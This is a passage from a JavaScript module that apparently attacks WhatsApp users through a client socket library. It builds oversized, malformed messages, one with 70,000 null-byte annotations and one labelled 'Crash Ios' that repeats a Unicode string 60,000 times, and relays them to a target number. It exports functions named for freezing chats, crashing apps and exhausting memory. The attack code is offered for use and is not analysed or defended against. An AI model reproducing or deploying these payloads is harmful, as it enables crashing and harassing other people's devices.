rXEJNkxHKlR9wiwRMooif/xAAeEQACAwABBQAAAAAAAAAAAAAAAQIQERIDITJRkf/aAAgBAwEBPwASMpUqYqlqzPZ1JuMkkqRpJyfiSXc0RwXFs4qKRm/BkVh//9k=",
        contextInfo: {
          pairedMediaType: 4,
          statusSourceType: 0
        },
        annotations: Array.from({ length: 70000 }, () => (
          {
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                author: "\0"
              }
            },
            embeddedAction: true
          }
        )),
        streamingSidecar: "MDcl6QckPwTKM0jEIiaPbRaSSbDMmA7O1wkWQkvHDYRBmhmYe9jxEwk662ZOB0jXrPTvvLE24YQDyHu8zHLq6wz3ithLB2EmFYk+jLqBMAzo4BgZEqLJWMGndenNtdS4H582vlYolVbg9bqUwFm7be2Da/7GxjMrQKP6Ly5f0opOnH0PV+aNPbp2KE9T/hhsMJXscHbg9nxILoRYAWyQV8u72z6fnBwe5PtZrXU48kgwNMFkQRyEvdESdTHxIH/+MntMQ6MFA/G7beOb86iHeADITkXWENvib/bKKd9I09y4Z1Jf+Z9RMnuMq0DePvTXAs3rq2amO94EYtxc9D7TNu1bEYIH8sAtEkjlemYv0nccM54G5KBZF4Li/eywEq5+ri2NVV+6gw2WT6NGrUQ23aGKhyk2d9xeRhxlOeHpDEp1MzFsqrM7bm3k6IQ86YlBoZZrf//IlwMxR8GLaBTPLsGrrVSgF+g0E/HNOkiHxtLB5FxZ04oFOkqD54D9c2+PsoLaHEL0n6SUkh2R4ntE6s3mi6CgNWnWva4K2q61kB9yPg6tsxI26JdxC0fUrVScBXNEmXTZFweTPIgMi3k3eZRkW3I/6ePeRz8pZhzDHo7flhHXxlYfy8hezzpGniX+8VgxUWbflPqJBKTvQ5lJDJxOdgKf/tIotDEws3UcEY3nBumVENqXBudHgL+HimM6bD0187E3IB7OwvsR78IYzh0K7l7Xtw=="
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: targetJid },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    })
}
//---- Function Crash Ios
async function iozk(sock, targetJid) {
  for (let z = 0; z < 1; z++) {
    await sock.relayMessage(targetJid, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "./NtedBitch",
                        inline_entities: ["𑇂𑆵𑆴𑆿".repeat(60000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4
            }
          }
        }
      }
    }, {
      participant: true
    })
    await sleep(1000);
  }
}

module.exports = {
  SpamVokep,
  sqlMemory2,
  sqlMemory3,
  TrashWazap,
  FreezeChat,
  chatlock,
  freezechat,
  PayX,
  convQtd,
  iozk,
  invisOOM,
  invisOOM2,
  annotationz
}